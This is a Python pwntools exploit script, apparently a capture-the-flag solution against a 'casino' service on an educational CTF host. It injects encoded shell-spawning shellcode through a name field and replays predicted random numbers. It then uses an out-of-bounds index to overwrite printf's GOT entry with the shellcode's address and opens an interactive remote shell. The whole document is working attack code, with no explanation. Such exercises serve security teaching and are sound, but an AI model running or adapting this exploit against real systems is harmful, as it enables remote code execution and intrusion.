# Please run with python2.7 for better compatibility
from pwn import *

# shellcode
context.clear(arch='x86_64')
sc = pwnlib.encoders.encoder.encode(asm(shellcraft.sh()))

# random number
p = process("./gen_num.out")
numbers = p.recvall().decode().split('\n')
del numbers[-1]
p.close()

# send
# r = process("./casino")
# elf = ELF("./casino")
r = remote('edu-ctf.csie.org', 10172)
r.sendlineafter('name: ', sc)
r.sendlineafter('age: ', '40')

# offset = (elf.got['printf'] - elf.bss['guess']) and name located at 6020f0
offset = -160 / 4
sc_idx = 0

for cnt_try in range(0, 2):
    cnt_num = 0
    print('round ', cnt_try)
    for i in numbers:
        r_out = 'Chose the number ' + str(cnt_num) + ': '
        r.sendlineafter(r_out, i)
        print('sending number ', i)
        cnt_num += 1

    r.recvuntil(':no]: ')
    r.sendline('1')

    r.recvuntil('[1 ~ 6]: ')
    r.sendline(str(offset + 1))
    print('finished sending offset')
    r.sendline(p64(0x6020f0))
    print('finished sending got location')

r.interactive()
r.close()
